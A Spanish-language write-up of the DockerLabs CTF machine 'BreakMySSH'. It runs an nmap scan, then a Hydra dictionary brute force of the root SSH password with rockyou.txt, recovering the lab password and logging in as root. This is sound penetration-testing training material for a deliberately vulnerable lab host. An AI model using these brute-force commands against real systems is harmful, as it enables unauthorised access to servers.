---
title: BreakMySSH
platform: DockerLabs
os: Linux
difficulty: Muy fácil
ip: 172.17.0.2
services: 22/tcp (SSH)
hops: 1
tags: [SSH, Hydra, Fuerza bruta, Root directo]
description: Único puerto SSH expuesto; ataque de fuerza bruta con Hydra sobre el usuario root revela la contraseña y da acceso directo con máximos privilegios.
---

## Fase 1: Reconocimiento
nmap · escaneo de puertos

Comenzamos realizando un escaneo general de puertos con `nmap` para identificar los servicios expuestos en la máquina víctima.

```terminal [nmap]
$ nmap -p- --open -sS -n -Pn 172.17.0.2
PORT   STATE SERVICE
==22/tcp open  ssh==
```

Únicamente encontramos el puerto 22 correspondiente al servicio **OpenSSH**.

## Fase 2: Explotación y Root directo {root}
hydra · ataque de fuerza bruta a SSH

Dado que no hay más superficie de ataque, procedemos a realizar un ataque de diccionario dirigido al usuario `root` usando `rockyou.txt`.

```terminal [hydra]
$ hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 32
[22][ssh] host: 172.17.0.2   login: root   password: ==breakmyssh==
```

Obtenemos la contraseña en cuestión de segundos. Nos conectamos directamente por SSH:

```terminal [ssh root]
$ ssh root@172.17.0.2
# whoami
==root==
# id
uid=0(root) gid=0(root) groups=0(root)
```

:::flag
¡Máquina completada! Acceso conseguido directamente como root.
uid=0(root)
:::
